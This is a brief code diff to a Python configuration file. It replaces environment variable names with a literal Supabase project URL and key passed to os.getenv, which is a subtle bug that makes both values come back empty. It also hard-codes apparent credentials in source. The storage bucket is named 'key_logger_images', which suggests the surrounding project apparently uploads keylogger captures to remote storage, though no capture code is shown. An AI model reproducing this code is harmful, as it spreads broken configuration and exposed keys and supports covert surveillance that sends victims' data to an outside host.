@@ -16,8 +16,8 @@ EMAIL = os.getenv("EMAIL")
 PASSWORD = os.getenv("PASSWORD")
 
 # Supabase Configuration
-SUPABASE_URL = os.getenv("SUPABASE_URL")
-SUPABASE_KEY = os.getenv("SUPABASE_KEY")
+SUPABASE_URL = os.getenv("https://uzhunwojvofavowpayim.supabase.co")
+SUPABASE_KEY = os.getenv("sb_publishable_tEpCocBx7Jq_le4R9v2Z3g_IavPVHzY")
 BUCKET_NAME = "key_logger_images"
 
 # Initialize Supabase client
